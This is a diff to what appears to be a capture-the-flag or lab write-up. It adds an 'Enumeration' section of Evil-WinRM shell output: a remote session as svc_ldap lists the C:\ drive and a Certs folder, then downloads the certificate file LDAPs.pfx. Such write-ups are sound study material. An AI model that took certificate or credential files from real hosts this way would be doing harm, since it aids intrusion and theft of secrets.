@@ -593,11 +593,46 @@ Mode                LastWriteTime         Length Name
 ### Enumeration
 
 ```
+*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> cd c:\
+*Evil-WinRM* PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/23/2023   6:16 PM                Certs
+d-----        3/28/2023   1:59 PM                Department Shares
+d-----        3/17/2023   9:20 AM                Development
+d-----         8/9/2022   7:00 PM                inetpub
+d-----        3/24/2023   8:22 PM                PerfLogs
+d-r---        3/25/2023   1:20 AM                Program Files
+d-----        3/25/2023   1:19 AM                Program Files (x86)
+d-----        4/23/2023   6:23 PM                pwm
+d-r---        3/24/2023  11:27 PM                Users
+d-----        7/12/2023   1:19 PM                Windows
+-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar
+
+
+*Evil-WinRM* PS C:\> cd Certs
+*Evil-WinRM* PS C:\Certs> ls
+
+
+    Directory: C:\Certs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
+
+
 *Evil-WinRM* PS C:\Certs> download LDAPs.pfx
                                         
 Info: Downloading C:\Certs\LDAPs.pfx to LDAPs.pfx
                                         
 Info: Download successful!
+*Evil-WinRM* PS C:\Certs> 
 
 ```
 
